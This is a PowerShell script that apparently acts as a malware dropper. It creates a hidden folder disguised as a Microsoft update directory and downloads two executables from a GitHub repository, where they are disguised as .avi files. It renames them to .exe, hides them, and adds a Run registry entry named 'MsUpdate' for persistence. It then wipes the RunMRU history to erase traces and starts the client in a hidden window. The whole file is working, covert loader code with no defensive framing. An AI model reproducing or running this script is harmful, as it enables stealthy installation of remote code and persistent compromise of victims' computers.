## Create directory
$ErrorActionPreference = 'SilentlyContinue'
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force 
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"
$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
if (-not (Test-Path $rutaLocalAgent)) {
    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
}
if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'RegUpdate.exe'
    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
}
$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent

# Copy Ejecuter
$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
$urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
if (-not (Test-Path $rutaLocalEjecuter)) {
    Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
}
if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.exe") {
    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.exe'
    Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
}
$atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter

# Registry path for the startup entries
$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$nombreEntrada = "MsUpdate"
if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe"
    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
}


# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

## Execution of the client
Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -ArgumentList "start" -WindowStyle Hidden